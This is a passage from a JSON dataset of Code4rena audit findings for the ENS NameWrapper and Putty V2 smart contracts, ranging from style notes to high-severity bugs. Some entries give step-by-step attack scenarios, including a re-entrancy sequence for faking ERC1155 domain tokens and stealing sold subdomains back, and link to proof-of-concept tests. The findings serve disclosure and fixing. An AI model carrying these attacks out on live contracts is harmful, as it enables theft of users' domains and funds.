      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/173",
      "tags": [],
      "finders": [
        "panprog",
        "PwnedNoMore",
        "zzzitron"
      ]
    },
    {
      "id": "5543",
      "title": "[H-02] The expiry of the parent node can be smaller than the one of a child node, violating the guarantee policy",
      "impact": "HIGH",
      "content": "\n[NameWrapper.sol#L504](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504)<br>\n[NameWrapper.sol#L356](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356)<br>\n\nBy design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.\n\nWhen a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.\n\n```solidity\nfunction _getDataAndNormaliseExpiry(\n    bytes32 parentNode,\n    bytes32 node,\n    uint64 expiry\n)\n    internal\n    view\n    returns (\n        address owner,\n        uint32 fuses,\n        uint64\n    )\n{\n    uint64 oldExpiry;\n    (owner, fuses, oldExpiry) = getData(uint256(node));\n    (, , uint64 maxExpiry) = getData(uint256(parentNode));\n    expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);\n    return (owner, fuses, expiry);\n}\n```\n\nHowever, the problem shows when\n\n*   The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`)\n*   The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero.\n*   When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`\n\nThe point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.\n\nSpecifically, considering the following scenario\n\n*   The hacker owns a domain (or a 2LD), e.g., `base.eth`\n*   The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`\n    *   The expiry should be as large as possible\n*   Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`\n    *   The expiry should be as large as possible\n*   The hacker unwraps his sub-domain, i.e., `sub1.base.eth`\n*   The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`\n    *   The expiry can be small than the one of sub2.sub1.base.eth\n\nThe root cause *seems* that we should not zero out the expiry when burning a node if the node holds any subnode.\n\n### Suggested Fix\n\n*   Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped.\n*   Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`\n\n### Proof of Concept / Attack Scenario\n\nFor full details, please see [original warden submission](https://github.com/code-423n4/2022-07-ens-findings/issues/187).\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/187)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the NameWrapper contract of the 2022-07-ens project. This vulnerability occurs when a parent node tries to setSubnodeOwner / setSubnodeRecord, and the code used to guarantee that the new expiry can only be extended up to the current one is not working as expected. \n\nThe vulnerability is demonstrated in a scenario where the hacker owns a domain (or a 2LD), e.g., base.eth, and assigns a sub-domain to himself, e.g., sub1.base.eth, with an expiry set to the maximum value. The hacker then assigns a sub-sub-domain, e.g., sub2.sub1.base.eth, also with an expiry set to the maximum value. The hacker then unwraps his sub-domain, i.e., sub1.base.eth, and re-wraps it via NameWrapper.setSubnodeOwner. In this case, the new expiry of sub1.base.eth can be set arbitrarily and smaller than the one of sub2.sub1.base.eth.\n\nThe root cause of this vulnerability is that the expiry is zeroed out when a node is burned, even if it holds child nodes. This relaxes the constraint on the expiry.\n\nTwo potential fixes are suggested: 1) auto-burn CANNOT_UNWRAP which thus lets expiry decide whether a node can be unwrapped, and 2) force the parent to have CANNOT_UNWRAP burnt if they want to set expiries on a child via setSubnodeOwner / setSubnodeRecord / setChildFuses.\n\nA Proof-of-Concept (PoC) code is provided to demonstrate the attack scenario. To run the PoC, put it in 2022-07-ens/test/wrapper and run npx hardhat test --grep 'PoC'. If there are any issues running the code, contact izhuer#0001 on Discord.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/187",
      "tags": [],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "5542",
      "title": "[H-01] It is possible to create fake ERC1155 `NameWrapper` token for subdomain, which is not owned by `NameWrapper`",
      "impact": "HIGH",
      "content": "\n[NameWrapper.sol#L820-L821](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L820-L821)<br>\n[NameWrapper.sol#L524](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L524)<br>\n[NameWrapper.sol#L572](https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L572)<br>\n\nDue to re-entrancy possibility in `NameWrapper._transferAndBurnFuses` (called from `setSubnodeOwner` and `setSubnodeRecord`), it is possible to do some stuff in `onERC1155Received` right after transfer but before new owner and new fuses are set. This makes it possible, for example, to unwrap the subdomain, but owner and fuses will still be set even for unwrapped domain, creating fake `ERC1155` `NameWrapper` token for domain, which is not owned by `NameWrapper`.\n\nFake token creation scenario:\n\n1.  `Account1` registers and wraps `test.eth` domain\n2.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` subdomain with `Account1` as owner (to make NameWrapper owner of subdomain)\n3.  `Contract1` smart contract is created, which calls unwrap in its `onERC1155Received` function, and a function to send `sub.test.eth` ERC1155 NameWrapper token back to `Account1`\n4.  `Account1` calls `NameWrapper.setSubnodeOwner` for `sub.test.eth` with `Contract1` as new owner, which unwraps domain back to `Account1` but due to re-entrancy, NameWrapper sets fuses and ownership to `Contract1`\n5.  `Account1` calls function to send ERC1155 token from `Contract1` back to self.\n\nAfter this sequence of events, `sub.test.eth` subdomain is owned by `Account1` both in `ENS` registry and in `NameWrapper` (with fuses and expiry correctly set to the future date). Lots (but not all) of functions in `NameWrapper` will fail to execute for this subdomain, because they expect `NameWrapper` to have ownership of the domain in `ENS`, but some functions will still work, making it possible to make the impression of good domain.\n\nAt this point, ownership in `NameWrapper` is \"detached\" from ownership in `ENS` and `Account1` can do all kinds of malcious stuff with its ERC1155 token. For example:\n\n1.  Sell subdomain to the other user, transfering `ERC1155` to that user and burning `PARENT_CANNOT_CONTROL` to create impression that he can't control the domain. After receiving the payment, `Account1` can wrap the domain again, which burns existing ownership record and replaces with the new one with clear fuses and `Account1` ownership, effectively stealing domain back from unsuspecting user, who thought that `ERC1155` gives him the right to the domain (and didn't expect that parent can clear fuses when `PARENT_CANNOT_CONTROL` is set).\n\n2.  Transfer subdomain to some other smart contract, which implements `onERC1155Received`, then take it back, fooling smart contract into believing that it has received the domain.\n\n### Proof of Concept\n\nCopy these to test/wrapper and run:<br>\nyarn test test/wrapper/NameWrapperReentrancy.js\n\n<https://gist.github.com/panprog/3cd94e3fbb0c52410a4c6609e55b863e>\n\n### Recommended Mitigation Steps\n\nConsider adding `nonReentrant` modifiers with `ReentrancyGuard` implementation from `openzeppelin`. Alternatively just fix this individual re-entrancy issue. There are multiple ways to fix it depending on expected behaviour, for example saving `ERC1155` data and requiring it to match the data after transfer (restricting `onERC1155Received` to not change any data for the token received):\n\n    function _transferAndBurnFuses(\n        bytes32 node,\n        address newOwner,\n        uint32 fuses,\n        uint64 expiry\n    ) internal {\n        (address owner, uint32 saveFuses, uint64 saveExpiry) = getData(uint256(node));\n        _transfer(owner, newOwner, uint256(node), 1, \"\");\n        uint32 curFuses;\n        uint64 curExpiry;\n        (owner, curFuses, curExpiry) = getData(uint256(node));\n        require(owner == newOwner && saveFuses == curFuses && saveExpiry == curExpiry);\n        _setFuses(node, newOwner, fuses, expiry);\n    }\n\n**[Arachnid (ENS) confirmed](https://github.com/code-423n4/2022-07-ens-findings/issues/84)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the NameWrapper contract of the 2022-07-ENS project. The vulnerability is related to the possibility of re-entrancy in the _transferAndBurnFuses function, which is called from setSubnodeOwner and setSubnodeRecord. This makes it possible to do some stuff in onERC1155Received right after the transfer but before the new owner and new fuses are set. This could lead to the creation of a fake ERC1155 NameWrapper token for a domain which is not owned by NameWrapper.\n\nFor example, an attacker could register and wrap a domain, call setSubnodeOwner to make NameWrapper the owner of the subdomain, create a contract with a function to send the subdomain ERC1155 NameWrapper token back to the attacker, and then call setSubnodeOwner with the contract as the new owner. After this sequence of events, the subdomain will be owned by the attacker both in ENS and in NameWrapper, but some functions in NameWrapper will still work, creating the impression of a good domain.\n\nThe recommended mitigation steps are to consider adding nonReentrant modifiers with ReentrancyGuard implementation from openzeppelin, or to fix the individual re-entrancy issue. A proof of concept can be found in the test/wrapper folder of the project.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "ENS",
      "source_link": "https://code4rena.com/reports/2022-07-ens",
      "github_link": "https://github.com/code-423n4/2022-07-ens-findings/issues/84",
      "tags": [
        "ERC1155",
        "Reentrancy"
      ],
      "finders": [
        "panprog",
        "brgltd",
        "cryptphi",
        "peritoflores",
        "Aussie_Battlers",
        "wastewa"
      ]
    },
    {
      "id": "42744",
      "title": "[N-10] NatSpec Is Missing",
      "impact": "LOW",
      "content": "\nNatSpec if missing for the following function\n\n*   `PuttyV2Nft._mint`  - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L11>\n*   `PuttyV2Nft.transferFrom` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L21>\n*   `PuttyV2Nft.balanceOf` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2Nft.sol#L40>\n\n### Recommendation\n\nImplement NatSpec for all functions.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/306#issuecomment-1178063479):**\n > High quality report.\n\n**[HickupHH3 commented](https://github.com/code-423n4/2022-06-putty-findings/issues/306#issuecomment-1186102954):**\n> > L-03 Insufficient Input Validation\n> \n> Disagree, I remember seeing there was a use case for having taker == maker discussed in 1 of the issues somewhere.\n> \n> > L-04 Order Cannot Be Filled Due To Unbounded Whitelist Within An Order\n> \n> Sort a duplicate of #290.\n> \n> Agree that overall it is a very good report! \n\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42743",
      "title": "[N-09] Incorrect functions visibility",
      "impact": "LOW",
      "content": "\nWhenever a function is not being called internally in the code, it can be easily declared as `external`, [saving also gas](https://github.com/crytic/slither/wiki/Detector-Documentation#description-44). While the entire code base have explicit visibilities for every function, some of them can be changed to be `external`.\n\nFollowing are some the functions that can be changed to be `external`\n\n*   `PuttyV2.fillorder`\n*   `PuttyV2.exercise`\n*   `PuttyV2.withdraw`\n*   `PuttyV2.batchFillOrder`\n*   `Putty.acceptCounterOffer`\n\n### Recommendation\n\nReview the visibility of the affected functions and change visibility of these functions to `external`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42742",
      "title": "[N-08] Unused imports",
      "impact": "LOW",
      "content": "\nTo improve readability and avoid confusion, consider removing the following unused imports:\n\nIn the `PuttyV2Nft` contract:\n\n*   openzeppelin/utils/Strings.sol\n\nNote that the `Strings.sol` has already been imported in `PuttyV2` contract. Thus, this import can be safely removed.\n\nWithin the `PuttyV2Nft` contract, it does not use any of the functions from `Strings.sol`.\n\n### Recommendation\n\nConsider removing the unused import if it is not required.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42741",
      "title": "[N-07] Inconsistent use of named return variables",
      "impact": "LOW",
      "content": "\nThere is an inconsistent use of named return variables in the `PuttyV2` contract\n\nSome functions return named variables, others return explicit values.\n\nFollowing function return explicit value\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L669>\n\n```solidity\nfunction isWhitelisted(address[] memory whitelist, address target) public pure returns (bool) {\n    for (uint256 i = 0; i < whitelist.length; i++) {\n        if (target == whitelist[i]) return true;\n    }\n\n    return false;\n}\n```\n\nFollowing function return return a named variable\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L683>\n\n```solidity\nfunction hashOppositeOrder(Order memory order) public view returns (bytes32 orderHash) {\n    // use decode/encode to get a copy instead of reference\n    Order memory oppositeOrder = abi.decode(abi.encode(order), (Order));\n\n    // get the opposite side of the order (short/long)\n    oppositeOrder.isLong = !order.isLong;\n    orderHash = hashOrder(oppositeOrder);\n}\n```\n\n### Recommendation\n\nConsider adopting a consistent approach to return values throughout the codebase by removing all named return variables, explicitly declaring them as local variables, and adding the necessary return statements where appropriate. This would improve both the explicitness and readability of the code, and it may also help reduce regressions during future code refactors.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42740",
      "title": "[N-06] Code Can Be Refactored To Be More Readable",
      "impact": "LOW",
      "content": "\nIn many parts of the `PuttyV2` contract, it uses the following conditions to check the type of the order being passed into the function:\n\n*   order.isLong && order.isCall (equal to long call)\n*   order.isLong && !order.isCall (equal to long put)\n*   order.!isLong && order.isCall (equal to short call)\n*   order.!isLong && order.!isCall (equal to short put)\n\nThese affect the readability of the codes as the readers have to interpret the condition to determine if it is a \"long call\", \"long put\", \"short call\" or \"short put\". This might increase the risk of mistakes in the future if new developer works on the contracts.\n\n### Recommendation\n\nConsider implementing the following functions to improve readability:\n\n*   isLongCall(Order order) public view returns (bool)\n*   isLongPut(Order order) public view returns (bool)\n*   isShortCall(Order order) public view returns (bool)\n*   isShortPut(Order order) public view returns (bool)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42739",
      "title": "[N-05] Consider two-phase ownership transfer",
      "impact": "LOW",
      "content": "\nAdmin calls `Ownable.transferOwnership` function to transfers the ownership to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a owner.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L53>\n\n```solidity\ncontract PuttyV2 is PuttyV2Nft, EIP712(\"Putty\", \"2.0\"), ERC721TokenReceiver, Ownable {\n```\n\n### Recommendation\n\nConsider implementing a two step process where the admin nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of admin to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42738",
      "title": "[N-04] Owner Can Renounce Ownership",
      "impact": "LOW",
      "content": "\nTypically, the contractâ€™s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.\n\nThe Openzeppelin's `Ownable` used in `PuttyV2` contract implements `renounceOwnership`. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L53>\n\n```solidity\n/**\n    @title PuttyV2\n    @author out.eth\n    @notice An otc erc721 and erc20 option market.\n */\ncontract PuttyV2 is PuttyV2Nft, EIP712(\"Putty\", \"2.0\"), ERC721TokenReceiver, Ownable {\n```\n\n### Recommendation\n\nWe recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42737",
      "title": "[N-03] Insufficient Tests",
      "impact": "LOW",
      "content": "\nIt is crucial to write tests with possibly 100% coverage for smart contract systems.\n\nThe following functions were found to be not included in the test cases:\n\n*   `PuttyV2.batchFillOrder` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L546>\n*   `PuttyV2.acceptCounterOffer` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573>\n\n### Recommendation\n\nIt is recommended to write proper tests for all possible code flows and specially edge cases\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42736",
      "title": "[N-02] Draft OpenZeppelin Dependencies",
      "impact": "LOW",
      "content": "\nThe `PuttyV2` contract utilised `draft-EIP712` , an OpenZeppelin contract. This contract is still a draft and is not considered ready for mainnet use. OpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L40>\n\n```solidity\nimport \"openzeppelin/utils/cryptography/SignatureChecker.sol\";\nimport \"openzeppelin/utils/cryptography/draft-EIP712.sol\";\nimport \"openzeppelin/utils/Strings.sol\";\n```\n\n### Recommendation\n\nEnsure the development team is aware of the risks of using a draft contract or consider waiting until the contract is finalised.\n\nOtherwise, make sure that development team are aware of the risks of using a draft OpenZeppelin contract and accept the risk-benefit trade-off.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42735",
      "title": "[N-01] Omissions in events",
      "impact": "LOW",
      "content": "\nThroughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters\n\n#### Instance #1 - Missing Old Value\n\nWhen setting a new `baseURI` and `fee`, only the new value is emitted within the event.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L228>\n\n```solidity\nfunction setBaseURI(string memory _baseURI) public payable onlyOwner {\n    baseURI = _baseURI;\n    emit NewBaseURI(_baseURI);\n}\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240>\n\n```solidity\nfunction setFee(uint256 _fee) public payable onlyOwner {\n    require(_fee < 30, \"fee must be less than 3%\");\n    fee = _fee;\n    emit NewFee(_fee);\n}\n```\n\nThe events should include the new value and old value where possible.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42734",
      "title": "[M-11] `fee` can change without the consent of users",
      "impact": "MEDIUM",
      "content": "_Submitted by Picodes, also found by 0xNineDec, 0xsanson, antonttc, berndartmueller, BowTiedWardens, catchup, dirk_y, Alex the Entreprenerd, horsefacts, Metatron, sseefried, and unforgiven_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L497>\n\n### Impact\n\nFees are applied during `withdraw`, but can change between the time the order is filled and its terms are agreed upon and the withdrawal time, leading to a loss of the expected funds for the concerned users.\n\n### Proof of Concept\n\nThe scenario would be:\n\n*   Alice and Bob agrees to fill an order at a time fees are 0.1%\n*   During the duration of the option, fees are increased to 3%\n*   At withdrawal they'll pay 3% of the strike, although they wouldn't have created the order in the first place with such fees\n\n### Recommended Mitigation Steps\n\nMitigation could be:\n\n*   Store the fees in `Order` and verify that they are correct when the order is filled, so they are hardcoded in the struct\n*   Add a timestamp: this wouldn't fully mitigate but would still be better than the current setup\n*   Keep past fees and fee change timestamps in memory (for example in an array) to be able to retrieve the creation time fees at withdrawal\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/422#issuecomment-1178988085):**\n > Report: Admin can change fee at any time for existing orders.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/422#issuecomment-1185414532):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269).\n\n***\n\n",
      "summary": "\nThe bug report highlights an issue with the PuttyV2 smart contract, where fees can be changed after an order is filled and before it is withdrawn. This can result in a loss of expected funds for users. A proof of concept scenario is provided, along with recommended mitigation steps such as storing fees in the order and adding a timestamp. The issue has been confirmed and resolved by the Putty Finance team, with a fix implemented in a pull request. A warden has also reviewed and approved the proposed mitigation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/422",
      "tags": [],
      "finders": []
    },
    {
      "id": "42733",
      "title": "[M-08] Overlap Between `ERC721.transferFrom()` and `ERC20.transferFrom()` Allows `order.erc20Assets` or `order.baseAsset` To Be ERC721 Rather Than ERC20",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird, also found by reassor and sseefried_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L344>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L360>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L601>\n\n### Impact\n\nBoth `ERC20.transferFrom(address to, address  from, uint256 amount)` and `ERC721.transferFrom(address to, address from, uint256 id)` have the same function signature `0x23b872dd`. The impact of this is it's possible for `baseAsset` or `erc20Assets` to be ERC721 addresses rather than ERC20.\n\nThese functions will successfully transfer the NFT into the protocol however they will fail to transfer the NFT out of the contract. That is because the outgoing transfer is `ERC20.safeTransfer()` which calls `transfer(to, amount)` which does not match up with any valid function signatures on ERC721.\n\nTherefore any ERC721 tokens transferred into the contract in this manner via `fillOrder()` will be permanently stuck in the contract as neither `exercise()` nor `withdraw()` will successfully transfer the tokens out of the contract.\n\n### Proof of Concept\n\n[ERC721.transferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC721.sol#L82-L86)\n\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public virtual {\n```\n\n[ERC20.transferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC20.sol#L90-L94)\n\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n```\n\n### Recommended Mitigation Steps\n\nConsider whitelisting approved ERC721 and ERC20 token contracts. Furthermore, separate these two contracts into different whitelists for ERC20s and ERC721s then ensure each contract is in the right category.\n\n**[outdoteth (Putty Finance) acknowledged and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/52#issuecomment-1179004318):**\n > Report: If an ERC721 token is used in places where ERC20 assets are supposed to be used then ERC721 tokens can get stuck in withdraw() and exercise().\n\n**hyh (warden) reviewed mitigation:**\n > Requires asset whitelisting, now addressed on UI/DB level.\n\n***\n\n",
      "summary": "\nThe bug report highlights an issue with two functions in the PuttyV2.sol contract, which have the same function signature. This means that it is possible for ERC721 tokens to be used in places where ERC20 tokens are supposed to be used. As a result, these ERC721 tokens can get stuck in the contract and cannot be transferred out. The report recommends implementing a whitelist for approved ERC20 and ERC721 token contracts to prevent this issue. The team behind Putty Finance has acknowledged and addressed this issue on the user interface and database level. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/52",
      "tags": [],
      "finders": []
    },
    {
      "id": "42732",
      "title": "[M-05] `fillOrder()` and `exercise()` may lock Ether sent to the contract, forever",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by 0x29A, 0xc0ffEE, 0xDjango, AmitN, auditor0517, berndartmueller, BowTiedWardens, cccz, danb, dipp, dirk_y, hansfriese, horsefacts, hyh, joestakey, kirk-baird, oyc_109, peritoflores, rfa, sashik_eth, simon135, sseefried, StErMi, swit, xiaoming90, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436>\n\n### Impact\n\n`fillOrder()` and `exercise()` have code paths that require Ether to be sent to them (e.g. using WETH as the base asset, or the provision of the exercise price), and therefore those two functions have the `payable` modifier. However, there are code paths within those functions that do not require Ether. Ether passed to the functions, when the non-Ether code paths are taken, is locked in the contract forever, and the sender gets nothing extra in return for it.\n\n### Proof of Concept\n\nEther can't be pulled from the `order.maker` during the filling of a long order, so `msg.value` shouldn't be provided here:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n323           if (order.isLong) {\n324               ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);\n325           } else {\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L323-L325>\n\nIf the `baseAsset` isn't WETH during order fulfillment, `msg.value` is unused:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n337               } else {\n338                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n339               }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L337-L339>\n\nSame for the exercise of call options:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n435               } else {\n436                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n437               }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437>\n\n### Recommended Mitigation Steps\n\nAdd a `require(0 == msg.value)` for the above three conditions.\n\n**[Alex the Entreprenerd (warden) 